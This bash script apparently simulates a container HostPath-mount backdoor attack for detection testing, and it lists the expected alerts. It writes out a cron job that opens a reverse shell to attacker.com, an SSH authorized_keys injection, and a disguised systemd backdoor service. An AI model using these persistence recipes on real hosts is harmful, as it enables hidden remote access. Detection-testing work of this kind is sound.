#!/bin/bash
# Attack: HostPath Volume Backdoor
# MITRE ATT&CK: Persistence - T1053.003
# Severity: CRITICAL
# Description: Exploits HostPath volume mounts to install persistent backdoors on host
# Prerequisites: HostPath volume must be mounted

set -e
echo "[+] Starting: HostPath Volume Backdoor"
echo "[+] MITRE ATT&CK: T1053.003 - Scheduled Task/Job: Cron"
echo "[+] Severity: CRITICAL"
echo ""

echo "[*] Step 1: Detecting HostPath mounts..."
echo "[*] Current mounts:"
mount | grep -v "tmpfs\|proc\|sysfs\|devpts" | head -10

echo ""
echo "[*] Step 2: Identifying writable host paths..."
WRITABLE_PATHS=()
for mount_point in $(mount | grep -v "tmpfs\|proc\|sysfs\|devpts\|ro," | awk '{print $3}'); do
    if [ -w "$mount_point" ] && [ "$mount_point" != "/" ] && [ "$mount_point" != "/tmp" ]; then
        echo "[+] Writable host mount found: $mount_point"
        WRITABLE_PATHS+=("$mount_point")
    fi
done

if [ ${#WRITABLE_PATHS[@]} -eq 0 ]; then
    echo "[!] No obviously writable host mounts detected"
    echo "[*] In a real scenario, common HostPath mounts include:"
    echo "    - /var/log (log collection)"
    echo "    - /var/lib/docker (Docker data)"
    echo "    - /etc (configuration)"
    echo "    - /root/.ssh (SSH keys)"
fi

echo ""
echo "[*] Step 3: Backdoor technique - Cron job persistence..."
echo "[*] If /var/spool/cron or /etc/cron.d is mounted:"
echo ""
echo "    # Create malicious cron job"
echo "    echo '* * * * * root /tmp/backdoor.sh' > /hostpath/etc/cron.d/backdoor"
echo "    chmod 644 /hostpath/etc/cron.d/backdoor"
echo ""
echo "    # Create backdoor script"
echo "    cat > /hostpath/tmp/backdoor.sh << 'EOF'"
echo "    #!/bin/bash"
echo "    bash -i >& /dev/tcp/attacker.com/4444 0>&1"
echo "    EOF"
echo "    chmod +x /hostpath/tmp/backdoor.sh"

echo ""
echo "[*] Step 4: Alternative - SSH authorized_keys..."
echo "[*] If /root/.ssh is mounted:"
echo ""
echo "    # Add attacker's public key"
echo "    echo 'ssh-rsa AAAAB3... attacker@evil' >> /hostpath/root/.ssh/authorized_keys"

echo ""
echo "[*] Step 5: Alternative - systemd service..."
echo "[*] If /etc/systemd/system is mounted:"
echo ""
echo "    # Create malicious service"
echo "    cat > /hostpath/etc/systemd/system/backdoor.service << 'EOF'"
echo "    [Unit]"
echo "    Description=System Service"
echo "    [Service]"
echo "    ExecStart=/tmp/backdoor.sh"
echo "    Restart=always"
echo "    [Install]"
echo "    WantedBy=multi-user.target"
echo "    EOF"

echo ""
echo "[*] Step 6: Simulating backdoor installation..."
if [ ${#WRITABLE_PATHS[@]} -gt 0 ]; then
    TEST_PATH="${WRITABLE_PATHS[0]}"
    echo "[*] Simulating backdoor in: $TEST_PATH"

    # Create simulation file
    if mkdir -p "$TEST_PATH/.backdoor_test" 2>/dev/null; then
        cat > "$TEST_PATH/.backdoor_test/payload.sh" << 'EOF'
#!/bin/bash
# Simulated persistent backdoor
echo "[BACKDOOR] Executed at $(date)" >> /tmp/backdoor.log
# In real attack: reverse shell to attacker
EOF
        chmod +x "$TEST_PATH/.backdoor_test/payload.sh"
        echo "[+] Created backdoor at: $TEST_PATH/.backdoor_test/payload.sh"
        ls -la "$TEST_PATH/.backdoor_test/"

        # Cleanup
        rm -rf "$TEST_PATH/.backdoor_test"
        echo "[*] Cleaned up simulation"
    else
        echo "[!] Could not write to mount point"
    fi
fi

echo ""
echo "[*] Step 7: Checking for Docker socket via HostPath..."
if [ -S /var/run/docker.sock ]; then
    echo "[+] Docker socket is accessible - can be exploited!"
    ls -la /var/run/docker.sock
fi

echo ""
echo "[✓] HostPath backdoor simulation completed"
echo "[i] In a real attack, this would:"
echo "    - Write cron jobs to host"
echo "    - Add SSH authorized_keys"
echo "    - Create systemd services"
echo "    - Modify host binaries"
echo "    - Install rootkits on host"
echo "    - Achieve persistent access"
echo ""
echo "[!] Expected detections:"
echo "    - HostPath volume mounts"
echo "    - File writes to host filesystem"
echo "    - New cron jobs or services"
echo "    - SSH authorized_keys modifications"
echo "    - Suspicious systemd unit files"
